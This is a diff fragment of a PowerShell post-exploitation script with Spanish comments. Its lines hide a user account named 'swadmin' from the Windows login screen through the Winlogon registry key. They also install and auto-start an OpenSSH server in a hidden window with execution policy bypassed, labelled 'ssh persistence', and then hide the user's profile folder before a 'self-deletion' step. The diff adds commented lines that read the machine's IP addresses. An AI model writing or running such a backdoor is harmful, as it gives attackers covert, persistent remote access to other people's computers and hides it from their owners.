@@ -52,12 +52,16 @@ cd $path
 Set-Location -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\';Get-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' | New-Item -Name 'SpecialAccounts\UserList' -Force;New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Name 'swadmin' -Value 00000000 -PropertyType DWord -Force
 cd $path
 
+
 #Estableciendo persistencia ssh
 powershell -windowstyle hidden -ep bypass Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0;Start-Service sshd;Set-Service -Name sshd -StartupType 'Automatic'
 
 #Ocultando usuario swadmin
 cd C:\Users
 attrib +h +s +r swadmin
+
+#obteniendo ip (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
+#obteniendo ip local (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Wi-Fi).IPAddress
 
 #Autoeliminacion
 cd $initial_dir
